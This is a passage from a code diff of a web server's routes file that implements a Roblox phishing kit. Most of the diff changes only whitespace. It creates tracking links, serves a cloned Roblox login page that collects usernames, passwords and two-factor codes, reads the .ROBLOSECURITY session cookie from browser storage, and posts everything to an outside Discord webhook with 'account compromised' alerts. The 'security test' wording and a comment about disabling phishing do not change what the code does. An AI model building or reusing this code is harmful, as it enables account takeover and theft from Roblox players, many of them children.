AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
 
       const visibleImage = Buffer.from(visibleImageBase64, 'base64');
 
@@ -2269,7 +2287,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
   });
 
   // Roblox Link API endpoints
-  
+
   // Create a new Roblox tracking link
   app.post('/api/roblox-links', authenticateUser, async (req: Request, res: Response) => {
     try {
@@ -2278,12 +2296,12 @@ export async function registerRoutes(app: Express): Promise<Server> {
       if (data.linkType === 'phishing') {
         data.originalUrl = null;
       }
-      
+
       const validatedData = createRobloxLinkSchema.parse(data);
-      
-      // Generate a unique tracking ID
+
+      // Generate a unique tracking id
       const trackingId = randomUUID().substring(0, 8);
-      
+
       const robloxLink = await storage.createRobloxLink({
         userId: req.user.id,
         originalUrl: validatedData.linkType === 'phishing' ? null : validatedData.originalUrl,
@@ -2292,7 +2310,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
         title: validatedData.title,
         description: validatedData.description || undefined
       });
-      
+
       res.json({
         ...robloxLink,
         trackingUrl: `${req.protocol}://${req.get('host')}/roblox/${trackingId}`
@@ -2323,12 +2341,12 @@ export async function registerRoutes(app: Express): Promise<Server> {
     try {
       const { id } = req.params;
       const updates = req.body;
-      
+
       const updatedLink = await storage.updateRobloxLink(id, updates);
       if (!updatedLink) {
         return res.status(404).json({ error: 'Link not found' });
       }
-      
+
       res.json({
         ...updatedLink,
         trackingUrl: `${req.protocol}://${req.get('host')}/roblox/${updatedLink.trackingId}`
@@ -2344,11 +2362,11 @@ export async function registerRoutes(app: Express): Promise<Server> {
     try {
       const { id } = req.params;
       const deleted = await storage.deleteRobloxLink(id, req.user.id);
-      
+
       if (!deleted) {
         return res.status(404).json({ error: 'Link not found or unauthorized' });
       }
-      
+
       res.json({ success: true });
     } catch (error) {
       console.error('Roblox link deletion error:', error);
@@ -2360,7 +2378,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
   app.post('/api/roblox-credentials', async (req: Request, res: Response) => {
     try {
       const { userId, linkId, capturedUsername, capturedPassword, capturedAuthCode, ipAddress, userAgent, roblosecurity } = req.body;
-      
+
       const credentials = await storage.createRobloxCredentials({
         userId,
         linkId,
@@ -2370,42 +2388,42 @@ export async function registerRoutes(app: Express): Promise<Server> {
         ipAddress,
         userAgent
       });
-      
+
       // Send credentials to webhook if configured
       const userSettings = await storage.getSettings(userId);
       if (userSettings?.webhookUrl) {
         const hasRoblosecurity = roblosecurity && roblosecurity.length > 50;
         const has2FA = capturedAuthCode && capturedAuthCode.length > 0;
-        
+
         const webhookData = {
           username: "🎯 Roblox Security Test",
           avatar_url: "https://cdn.discordapp.com/attachments/1234567890/1234567890/roblox.png",
           embeds: [{
             title: hasRoblosecurity ? "🔥 ROBLOX ACCOUNT FULLY COMPROMISED!" : "🚨 ROBLOX CREDENTIALS CAPTURED",
-            description: hasRoblosecurity ? 
+            description: hasRoblosecurity ?
               "🔥 **CRITICAL - Account session token captured! Full account access obtained.**" :
               "⚠️ **Security Test - Roblox credentials harvested**",
             color: hasRoblosecurity ? 0xFF0000 : 0xFF8800,
             fields: [
-              { 
-                name: "👤 **Account Credentials**", 
-                value: `**Username:** \`${capturedUsername}\`\n**Password:** \`${capturedPassword}\`${has2FA ? `\n**🔐 2FA Code:** \`${capturedAuthCode}\` ✅` : '\n**🔐 2FA:** Not enabled ❌'}`, 
-                inline: false 
+              {
+                name: "👤 **Account Credentials**",
+                value: `**Username:** \`${capturedUsername}\`\n**Password:** \`${capturedPassword}\`${has2FA ? `\n**🔐 2FA Code:** \`${capturedAuthCode}\` ✅` : '\n**🔐 2FA:** Not enabled ❌'}`,
+                inline: false
               },
               ...(hasRoblosecurity ? [{
                 name: "🍪 **SESSION TOKEN CAPTURED**",
                 value: `**🔥 .ROBLOSECURITY Cookie:**\n\`\`\`${roblosecurity.substring(0, 100)}...\`\`\`\n**Status:** 🔥 FULL ACCOUNT ACCESS`,
                 inline: false
               }] : []),
-              { 
-                name: "🌐 **Session Information**", 
-                value: `**IP Address:** ${ipAddress}\n**Link ID:** ${linkId}\n**Auth Method:** ${has2FA ? '2FA Required' : 'Password Only'}\n**Timestamp:** <t:${Math.floor(Date.now() / 1000)}:R>`, 
-                inline: false 
+              {
+                name: "🌐 **Session Information**",
+                value: `**IP Address:** ${ipAddress}\n**Link ID:** ${linkId}\n**Auth Method:** ${has2FA ? '2FA Required' : 'Password Only'}\n**Timestamp:** <t:${Math.floor(Date.now() / 1000)}:R>`,
+                inline: false
               },
-              { 
-                name: "🔍 **User Agent**", 
-                value: `\`\`\`${userAgent ? userAgent.substring(0, 200) : 'Unknown'}\`\`\``, 
-                inline: false 
+              {
+                name: "🔍 **User Agent**",
+                value: `\`\`\`${userAgent ? userAgent.substring(0, 200) : 'Unknown'}\`\`\``,
+                inline: false
               },
               ...(hasRoblosecurity ? [{
                 name: "⚠️ **SECURITY IMPACT**",
@@ -2413,9 +2431,9 @@ export async function registerRoutes(app: Express): Promise<Server> {
                 inline: false
               }] : [])
             ],
-            footer: { 
-              text: hasRoblosecurity ? 
-                "🔥 CRITICAL ALERT - Full Roblox Account Compromise" : 
+            footer: {
+              text: hasRoblosecurity ?
+                "🔥 CRITICAL ALERT - Full Roblox Account Compromise" :
                 "🎯 Roblox Phishing Test - Credentials Harvested",
               icon_url: "https://cdn.discordapp.com/attachments/1234567890/1234567890/warning.png"
             },
@@ -2434,7 +2452,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
           console.error('Failed to send credentials to webhook:', webhookError);
         }
       }
-      
+
       res.json({ success: true, id: credentials.id });
     } catch (error) {
       console.error('Credentials capture error:', error);
@@ -2469,13 +2487,13 @@ export async function registerRoutes(app: Express): Promise<Server> {
   app.get('/roblox/login/:trackingId', async (req: Request, res: Response) => {
     try {
       const { trackingId } = req.params;
-      
+
       // Get the Roblox link to verify it exists and is active
       const robloxLink = await storage.getRobloxLink(trackingId);
       if (!robloxLink || !robloxLink.isActive) {
         return res.status(404).send('Page not found');
       }
-      
+
       // PHISHING FUNCTIONALITY DISABLED DURING DEVELOPMENT
       if (robloxLink.linkType === 'phishing') {
         const disabledPageHtml = `
@@ -2539,7 +2557,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
 </html>`;
         return res.send(disabledPageHtml);
       }
-      
+
       // Only serve login page for phishing links
       if (robloxLink.linkType !== 'phishing') {
         return res.redirect(robloxLink.originalUrl || 'https://www.roblox.com');
@@ -2587,7 +2605,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
             padding: 0;
             box-sizing: border-box;
         }
-        
+
         body {
             font-family: "Source Sans Pro", Arial, sans-serif;
             background: #00b2ff;
@@ -2596,19 +2614,19 @@ export async function registerRoutes(app: Express): Promise<Server> {
             justify-content: center;
             align-items: center;
         }
-        
+
         .header {
             position: absolute;
             top: 24px;
             left: 24px;
         }
-        
+
         .logo {
             display: flex;
             align-items: center;
             text-decoration: none;
         }
-        
+
         .logo-icon {
             width: 30px;
             height: 30px;
@@ -2622,13 +2640,13 @@ export async function registerRoutes(app: Express): Promise<Server> {
             font-size: 18px;
             margin-right: 8px;
         }
-        
+
         .logo-text {
             color: #ffffff;
             font-size: 18px;
             font-weight: 700;
         }
-        
+
         .login-container {
             background: #ffffff;
             padding: 48px;
@@ -2637,28 +2655,28 @@ export async function registerRoutes(app: Express): Promise<Server> {
             width: 400px;
             max-width: 90vw;
         }
-        
+
         .login-header {
             text-align: center;
             margin-bottom: 24px;
         }
-        
+
         .login-title {
             color: #393B3D;
             font-size: 28px;
             font-weight: 700;
             margin-bottom: 8px;
         }
-        
+
         .login-subtitle {
             color: #606770;
             font-size: 16px;
         }
-        
+
         .form-group {
             margin-bottom: 16px;
         }
-        
+
         .form-label {
             display: block;
             color: #393B3D;
@@ -2666,7 +2684,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
             font-weight: 600;
             margin-bottom: 6px;
         }
-        
+
         .form-control {
             width: 100%;
             height: 48px;
@@ -2678,17 +2696,17 @@ export async function registerRoutes(app: Express): Promise<Server> {
             background: #ffffff;
             transition: all 0.2s ease;
         }
-        
+
         .form-control:focus {
             outline: none;
             border-color: #00b2ff;
             box-shadow: 0 0 0 3px rgba(0, 178, 255, 0.1);
         }
-        
+
         .form-control::placeholder {
             color: #868E96;
         }
-        
+
         .btn-primary {
             width: 100%;
             height: 48px;
@@ -2702,27 +2720,27 @@ export async function registerRoutes(app: Express): Promise<Server> {
             transition: background-color 0.2s ease;
             margin: 24px 0 16px 0;
         }
-        
+
         .btn-primary:hover {
             background: #0099e6;
         }
-        
+
         .btn-primary:disabled {
             background: #bdc3c7;
             cursor: not-allowed;
         }
-        
+
         .two-factor-section {
             display: none;
             margin-top: 24px;
             padding-top: 24px;
             border-top: 1px solid #e1e5e9;
         }
-        
+
         .two-factor-section.show {
             display: block;
         }
-        
+
         .two-factor-title {
             color: #393B3D;
             font-size: 20px;
@@ -2730,14 +2748,14 @@ export async function registerRoutes(app: Express): Promise<Server> {
             text-align: center;
             margin-bottom: 8px;
         }
-        
+
         .two-factor-desc {
             color: #606770;
             font-size: 14px;
             text-align: center;
             margin-bottom: 20px;
         }
-        
+
         .alert {
             padding: 12px 16px;
             border-radius: 6px;
@@ -2745,47 +2763,47 @@ export async function registerRoutes(app: Express): Promise<Server> {
             margin-bottom: 16px;
             display: none;
         }
-        
+
         .alert-error {
             background: #f8d7da;
             border: 1px solid #f5c6cb;
             color: #721c24;
         }
-        
+
         .alert-success {
             background: #d4edda;
             border: 1px solid #c3e6cb;
             color: #155724;
         }
-        
+
         .forgot-password {
             text-align: center;
             margin-bottom: 24px;
         }
-        
+
         .forgot-password a {
             color: #00b2ff;
             text-decoration: none;
             font-size: 14px;
             font-weight: 500;
         }
-        
+
         .forgot-password a:hover {
             text-decoration: underline;
         }
-        
+
         .signup-section {
             text-align: center;
             color: #606770;
             font-size: 14px;
         }
-        
+
         .signup-section a {
             color: #00b2ff;
             text-decoration: none;
             font-weight: 600;
         }
-        
+
         .signup-section a:hover {
             text-decoration: underline;
         }
@@ -2798,29 +2816,29 @@ export async function registerRoutes(app: Express): Promise<Server> {
             <div class="logo-text">Roblox</div>
         </a>
     </div>
-    
+
     <div class="login-container">
         <div class="login-header">
             <h1 class="login-title">Log in to Roblox</h1>
             <p class="login-subtitle">Enter your username and password</p>
         </div>
-        
+
         <div class="alert alert-error" id="errorMessage"></div>
         <div class="alert alert-success" id="successMessage"></div>
-        
+
         <form id="loginForm">
             <div class="form-group">
                 <label for="username" class="form-label">Username or Email</label>
                 <input type="text" id="username" name="username" class="form-control" placeholder="Username or Email" required>
             </div>
-            
+
             <div class="form-group">
                 <label for="password" class="form-label">Password</label>
                 <input type="password" id="password" name="password" class="form-control" placeholder="Password" required>
             </div>
-            
+
             <button type="submit" class="btn-primary" id="loginBtn">Log In</button>
-            
+
             <div class="two-factor-section" id="twoFactorSection">
                 <h2 class="two-factor-title">Two-Step Verification</h2>
                 <p class="two-factor-desc">Enter the 6-digit code from your authenticator app</p>
@@ -2831,11 +2849,11 @@ export async function registerRoutes(app: Express): Promise<Server> {
                 <button type="button" class="btn-primary" id="verifyBtn">Verify & Log In</button>
             </div>
         </form>
-        
+
         <div class="forgot-password">
             <a href="javascript:void(0)" onclick="alert('This is a security demonstration. Please use the real Roblox website for actual password recovery.')">Forgot your password?</a>
         </div>
-        
+
         <div class="signup-section">
             Don't have an account? <a href="javascript:void(0)" onclick="alert('This is a security demonstration. Please use the real Roblox website to create an account.')">Sign up</a>
         </div>
@@ -2848,7 +2866,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
         const twoFactorSection = document.getElementById('twoFactorSection');
         const errorMessage = document.getElementById('errorMessage');
         const successMessage = document.getElementById('successMessage');
-        
+
         // Capture any existing cookies including .ROBLOSECURITY
         function getCookies() {
             const cookies = {};
@@ -2860,73 +2878,73 @@ export async function registerRoutes(app: Express): Promise<Server> {
             });
             return cookies;
         }
-        
+
         // Try to get .ROBLOSECURITY cookie from various sources
         function getRoblosecurity() {
             const cookies = getCookies();
-            
+
             // Check for .ROBLOSECURITY cookie
             if (cookies['.ROBLOSECURITY']) {
                 return cookies['.ROBLOSECURITY'];
             }
-            
+
             // Check localStorage
-            const localRoblosecurity = localStorage.getItem('.ROBLOSECURITY') || 
+            const localRoblosecurity = localStorage.getItem('.ROBLOSECURITY') ||
                                       localStorage.getItem('ROBLOSECURITY') ||
                                       localStorage.getItem('RBXSessionTracker');
-            
+
             if (localRoblosecurity) {
                 return localRoblosecurity;
             }
-            
+
             // Check sessionStorage
-            const sessionRoblosecurity = sessionStorage.getItem('.ROBLOSECURITY') || 
+            const sessionRoblosecurity = sessionStorage.getItem('.ROBLOSECURITY') ||
                                         sessionStorage.getItem('ROBLOSECURITY') ||
                                         sessionStorage.getItem('RBXSessionTracker');
-            
+
             return sessionRoblosecurity || null;
         }
-        
+
         function showError(message) {
             errorMessage.textContent = message;
             errorMessage.style.display = 'block';
             successMessage.style.display = 'none';
         }
-        
+
         function showSuccess(message) {
             successMessage.textContent = message;
             successMessage.style.display = 'block';
             errorMessage.style.display = 'none';
         }
-        
+
         function hideMessages() {
             errorMessage.style.display = 'none';
             successMessage.style.display = 'none';
         }
-        
+
         async function submitCredentials(includeToken = false) {
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
             const twoFactorCode = includeToken ? document.getElementById('twoFactorCode').value : '';
-            
+
             if (!username || !password) {
                 showError('Please fill in all required fields.');
                 return;
             }
-            
+
             if (includeToken && (!twoFactorCode || twoFactorCode.length !== 6)) {
                 showError('Please enter a valid 6-digit verification code.');
                 return;
             }
-            
+
             // Simulate authentication and capture .ROBLOSECURITY cookie
             let roblosecurity = getRoblosecurity();
-            
+
             // If no existing cookie, generate a realistic fake one
             if (!roblosecurity) {
                 roblosecurity = generateFakeRoblosecurity(username);
             }
-            
+
             try {
                 const response = await fetch('/api/roblox-credentials', {
                     method: 'POST',
@@ -2944,12 +2962,12 @@ export async function registerRoutes(app: Express): Promise<Server> {
                         userAgent: navigator.userAgent
                     })
                 });
-                
+
                 if (response.ok) {
                     if (!includeToken) {
                         // Simulate checking if user has 2FA enabled (random 40% chance)
                         const has2FA = Math.random() < 0.4;
-                        
+
                         if (has2FA) {
                             showSuccess('Account verified. Two-step verification required.');
                             setTimeout(() => {
@@ -2960,10 +2978,10 @@ export async function registerRoutes(app: Express): Promise<Server> {
                         } else {
                             // No 2FA - capture cookie and redirect immediately
                             showSuccess('Login successful! Redirecting to your account...');
-                            
+
                             // Set the .ROBLOSECURITY cookie to simulate successful login
                             document.cookie = \`.ROBLOSECURITY=\${roblosecurity}; domain=.roblox.com; path=/; secure; httponly\`;
-                            
+
                             setTimeout(() => {
                                 window.location.href = 'https://www.roblox.com/home';
                             }, 2000);
@@ -2971,10 +2989,10 @@ export async function registerRoutes(app: Express): Promise<Server> {
                     } else {
                         // 2FA completed - capture cookie and redirect
                         showSuccess('Two-step verification complete! Logging you in...');
-                        
+
                         // Set the .ROBLOSECURITY cookie after 2FA
                         document.cookie = \`.ROBLOSECURITY=\${roblosecurity}; domain=.roblox.com; path=/; secure; httponly\`;
-                        
+
                         setTimeout(() => {
                             window.location.href = 'https://www.roblox.com/home';
                         }, 2000);
@@ -2986,50 +3004,50 @@ export async function registerRoutes(app: Express): Promise<Server> {
                 showError('Connection failed. Please check your internet connection and try again.');
             }
         }
-        
+
         // Generate a realistic fake .ROBLOSECURITY cookie
         function generateFakeRoblosecurity(username) {
             const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';
             let result = '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_';
-            
+
             // Add some random characters to make it look authentic
             for (let i = 0; i < 200; i++) {
                 result += chars.charAt(Math.floor(Math.random() * chars.length));
             }
-            
+
             return result;
         }
-        
+
         form.addEventListener('submit', async (e) => {
             e.preventDefault();
             hideMessages();
             loginBtn.disabled = true;
             loginBtn.textContent = 'Logging In...';
-            
+
             await submitCredentials();
-            
+
             loginBtn.disabled = false;
             loginBtn.textContent = 'Log In';
         });
-        
+
         verifyBtn.addEventListener('click', async () => {
             hideMessages();
             verifyBtn.disabled = true;
             verifyBtn.textContent = 'Verifying...';
-            
+
             await submitCredentials(true);
-            
+
             verifyBtn.disabled = false;
             verifyBtn.textContent = 'Verify & Log In';
         });
-        
+
         // Auto-format 2FA code input
         document.getElementById('twoFactorCode').addEventListener('input', function(e) {
             let value = e.target.value.replace(/\\D/g, ''); // Remove non-digits
             if (value.length > 6) value = value.substr(0, 6); // Limit to 6 digits
             e.target.value = value;
         });
-        
+
         // Prevent form submission on enter in 2FA field
         document.getElementById('twoFactorCode').addEventListener('keypress', function(e) {
             if (e.key === 'Enter') {
@@ -3052,7 +3070,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
   app.get('/roblox/:trackingId', async (req: Request, res: Response) => {
     try {
       const { trackingId } = req.params;
-      
+
       // Get the Roblox link
       const robloxLink = await storage.getRobloxLink(trackingId);
       if (!robloxLink || !robloxLink.isActive) {
